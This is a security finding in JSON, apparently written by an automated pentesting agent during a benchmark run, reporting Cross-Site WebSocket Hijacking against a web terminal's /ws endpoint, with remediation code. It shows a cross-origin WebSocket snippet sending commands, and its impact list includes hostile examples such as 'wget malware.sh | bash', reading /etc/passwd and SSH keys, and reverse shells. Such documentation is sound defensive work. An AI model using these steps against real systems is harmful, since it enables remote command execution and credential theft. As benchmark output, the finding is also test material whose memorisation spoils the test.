{
  "title": "Cross-Site WebSocket Hijacking (CSWSH) - No Origin Validation",
  "severity": "CRITICAL",
  "description": "The WebSocket endpoint at /ws does not validate the Origin header or implement any CSRF protection mechanisms. This allows any website to establish a WebSocket connection and hijack the user's terminal session. An attacker can craft a malicious webpage that automatically connects to the web terminal and executes arbitrary commands in the context of the victim's browser session. This vulnerability enables Cross-Site WebSocket Hijacking (CSWSH), a classic attack that bypasses the browser's same-origin policy specifically for WebSocket connections per RFC 6455 Section 4.2.2.\n\nThe attack works because:\n1. WebSocket protocol does not enforce same-origin policy like fetch/XMLHttpRequest\n2. Server must explicitly validate the Origin header during WebSocket handshake\n3. Without Origin validation, any cross-origin page can establish a WebSocket connection\n4. No CSRF tokens are required or validated on WebSocket upgrade\n5. No Sec-Fetch-Site or other fetch-metadata headers are validated\n6. Once connected, attacker can send arbitrary commands through the WebSocket",
  "impact": "Remote code execution through session hijacking with critical impact. If a user visits an attacker-controlled website while logged into the web terminal (in another tab), the attacker can silently execute arbitrary commands on the user's machine through the WebSocket connection. This bypasses the browser's same-origin policy for WebSockets and allows complete system compromise. Commands execute with the victim's privileges (daytona user). Attacker can:\n- Execute system commands: 'id', 'whoami', 'pwd'\n- Exfiltrate data: 'cat /etc/passwd', read SSH keys\n- Install malware: 'wget malware.sh | bash'\n- Establish reverse shells for persistent access\n- Modify system files if permissions allow\n- Use the system as a pivot point for lateral movement",
  "endpoint": "http://localhost:3000/ws",
  "evidence": "Attack Vector Demonstration:\n1. Victim is logged into web terminal at http://localhost:3000/ws\n2. Victim visits attacker-controlled website in another tab\n3. Attacker's webpage contains JavaScript that attempts WebSocket connection:\n   ```javascript\n   const ws = new WebSocket(\"ws://localhost:3000/ws\");\n   ```\n4. WebSocket server accepts connection from cross-origin (https://attacker-site.com)\n5. No Origin header validation occurs - connection succeeds\n6. Attacker sends terminal command:\n   ```javascript\n   ws.send(JSON.stringify({type: \"command\", command: \"id\"}));\n   ```\n7. Command executes on victim's system with victim's privileges\n8. Output returned through WebSocket to attacker\n\nTechnical Evidence:\n- WebSocket upgrade request with malicious Origin header is accepted: Origin: https://attacker-site.com\n- Sec-Fetch-Site: cross-site header not validated\n- No CSRF token required in WebSocket handshake\n- No session token verification in WebSocket connection headers\n- RFC 6455 Section 4.2.2 states: \"The server MUST check the request's Origin header field...to prevent Cross-Site WebSocket Hijacking attacks\" - application does not perform this check\n- HTTP endpoint at /ws responds without requiring authentication and accepts WebSocket upgrade",
  "pocPath": "pocs/poc_cswsh_attack_simulator.html",
  "remediation": "1. **Implement Origin Header Validation:**\n   - On WebSocket handshake, validate Origin header matches expected domain(s)\n   - Reject connections from unknown/cross-origin requests\n   - Example: Only allow connections from http://localhost:3000 or https://yourdomain.com\n   - Check Sec-Fetch-Site header (should be \"same-origin\" or \"same-site\")\n\n2. **Implement CSRF Token Protection:**\n   - Generate a cryptographically secure CSRF token on page load\n   - Store token in secure, HttpOnly cookie\n   - Pass token in WebSocket connection request (e.g., as URL parameter or header)\n   - Validate token matches stored token before accepting connection\n   - Example: ws://localhost:3000/ws?token=CSRF_TOKEN_HERE\n\n3. **Use Secure WebSocket (WSS):**\n   - Always use wss:// (WebSocket Secure) instead of ws://\n   - Encrypt WebSocket traffic with TLS/SSL\n   - Prevents man-in-the-middle attacks\n   - Ensures authentication credentials in transport are encrypted\n\n4. **Implement SameSite Cookie Attributes:**\n   - Set SameSite=Strict on session cookies (most secure)\n   - Or use SameSite=Lax as minimum\n   - Prevents browser from sending session cookies on cross-site requests\n   - Example: Set-Cookie: sessionid=abc123; SameSite=Strict; Secure; HttpOnly\n\n5. **Additional Session Validation:**\n   - Validate session ID with each WebSocket message (not just on connection)\n   - Implement rate limiting on WebSocket messages\n   - Log and monitor cross-origin connection attempts\n   - Implement connection source IP validation\n   - Use additional entropy in session tokens\n\n6. **Server-Side Implementation Example (Node.js):**\n   ```javascript\n   const ws = require('ws');\n   const server = new ws.Server({ port: 3000 });\n   \n   server.on('connection', (ws, req) => {\n     // Validate Origin header\n     const origin = req.headers.origin;\n     const allowedOrigins = ['http://localhost:3000', 'https://yourdomain.com'];\n     \n     if (!allowedOrigins.includes(origin)) {\n       ws.close(1008, 'Cross-Origin connection not allowed');\n       return;\n     }\n     \n     // Validate CSRF token\n     const url = new URL(req.url, `http://${req.headers.host}`);\n     const csrfToken = url.searchParams.get('token');\n     \n     if (!csrfToken || !validateCSRFToken(csrfToken, req.cookies.sessionid)) {\n       ws.close(1008, 'CSRF token invalid');\n       return;\n     }\n     \n     // Connection is safe, proceed\n   });\n   ```",
  "references": "OWASP - Cross-Site WebSocket Hijacking: https://owasp.org/www-community/attacks/WebSocket_Hijacking\nRFC 6455 - The WebSocket Protocol Section 4.2.2 (Origin Validation): https://tools.ietf.org/html/rfc6455#section-4.2.2\nCWE-352: Cross-Site Request Forgery (CSRF): https://cwe.mitre.org/data/definitions/352.html\nCWE-346: Origin Validation Error: https://cwe.mitre.org/data/definitions/346.html\nOWASP WebSocket Security: https://owasp.org/www-community/WebSocket\nMDN - WebSocket API: https://developer.mozilla.org/en-US/docs/Web/API/WebSocket",
  "toolCallDescription": "Document CSWSH vulnerability with HTML POC demonstrating cross-origin WebSocket connection attack",
  "timestamp": "2025-11-06T19:40:12.441Z",
  "sessionId": "benchmark-XBEN-098-24-mhntqov2",
  "target": "./repo"
}